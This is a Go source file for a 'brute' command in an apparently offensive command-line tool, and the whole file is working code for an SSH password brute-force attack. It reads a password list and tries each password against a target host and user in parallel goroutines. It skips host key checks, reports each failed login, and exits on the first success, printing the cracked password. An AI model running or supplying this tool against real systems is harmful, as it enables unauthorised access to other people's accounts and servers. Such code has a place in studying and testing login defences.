/*
Copyright © 2021 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"errors"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/go-ping/ping"
	// "github.com/gocolly/colly"
	// "github.com/jlaffaye/ftp"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

// bruteCmd represents the brute command
type response struct {
	Hostname string
	// Service  string
	Port     int
	Username string
	ListPath string
	Interval int
}

var hn []string

var answers = response{}

var bruteCmd = &cobra.Command{
	Use:   "brute",
	Short: "crack a password",
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) != 1 {
			return errors.New(color.RedString("expected 1 argument, got " + fmt.Sprint(len(args))))
		}
		hn = strings.Split(args[0], "@") // check for username
		if len(hn) == 2 {
			answers.Username, answers.Hostname = hn[0], hn[1]
		} else {
			answers.Hostname = args[0]
		}
		if _, err := ping.NewPinger(answers.Hostname); err != nil {
			return errors.New(color.RedString("invalid hostname"))
		}
		answers.Hostname = args[0]
		return nil
	},
	RunE: func(cmd *cobra.Command, args []string) error {
		if len(hn) == 2 {
			answers.Username, answers.Hostname = hn[0], hn[1]
		}
		passwords, err := readFile(answers.ListPath)
		if err != nil {
			return errors.New(color.RedString(err.Error()))
		}
		wg := sync.WaitGroup{}
		s := strings.Split(args[0], "@")
		if len(s) == 2 {
			answers.Username = s[0]
		}

		// brute force
		wg.Add(len(passwords))
		for _, pass := range passwords {
			sshConfig := &ssh.ClientConfig{
				User: answers.Username,
				Auth: []ssh.AuthMethod{ssh.Password(pass)},
			}
			sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()
			go func(p string) {
				defer wg.Done()
				client, err := ssh.Dial("tcp", answers.Hostname+":"+fmt.Sprint(answers.Port), sshConfig)
				if err != nil {
					if strings.Contains(err.Error(), "unable to authenticate") {
						fmt.Println(color.RedString("[-] ") + "authentication for user " + color.CyanString(answers.Username) + " with password " + color.CyanString(p) + " failed")
						return
					} else {
						fmt.Println(color.RedString("[-] ") + err.Error())
					}
				}
				if client != nil {
					err = client.Close()
				}
				if err == nil {
					fmt.Println(color.GreenString("[+] ") + "successfully authenticated as user " + color.CyanString(answers.Username) + " with password " + color.CyanString(p))
					os.Exit(0)
				}
			}(pass)
			time.Sleep(time.Duration(answers.Interval) * time.Millisecond)
		}
		wg.Wait()
		return nil
	},
}

func init() {
	rootCmd.AddCommand(bruteCmd)
	bruteCmd.Flags().StringVarP(&answers.Username, "username", "u", "", "the username of the user to attempt to login to")
	bruteCmd.Flags().IntVarP(&answers.Port, "port", "p", 22, "the port the service is running on")
	bruteCmd.Flags().StringVarP(&answers.ListPath, "passwords", "P", "", "list of passwords to try (required)")
	bruteCmd.Flags().IntVarP(&answers.Interval, "interval", "i", 750, "interval between ssh attempts")
	bruteCmd.Flags().Lookup("port").Usage = "the port to brute force (required)"
	bruteCmd.Flags().Lookup("username").Usage = "the username of the user to attempt to login to"

	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// bruteCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// bruteCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
